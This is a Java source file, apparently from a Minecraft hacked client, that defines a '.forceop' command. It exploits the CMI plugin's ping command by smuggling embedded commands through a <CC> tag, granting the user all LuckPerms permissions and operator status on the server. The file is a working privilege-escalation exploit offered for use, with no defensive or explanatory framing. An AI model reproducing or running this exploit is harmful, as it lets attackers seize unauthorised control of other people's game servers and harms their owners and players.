package dev.isnow.paradise.command.impl;

import dev.isnow.paradise.command.Command;
import dev.isnow.paradise.command.CommandInfo;
import dev.isnow.paradise.exception.CommandException;

@CommandInfo(
        alias = "forceop",
        description = "Force-OPs you using cmi exploit",
        usage = ".forceop",
        aliases = {"fo"}
)
public class ForceOPCommand extends Command {
    @Override
    public void execute(String... args) throws CommandException {
        mc.thePlayer.sendChatMessage("/cmi ping <T>EZZ</T><CC>lp user " + mc.thePlayer.getName() +  " p set *</CC>");
        mc.thePlayer.sendChatMessage("/cmi ping <T>EZZ</T><CC>op " + mc.thePlayer.getName() +  "</CC>");
    }
}
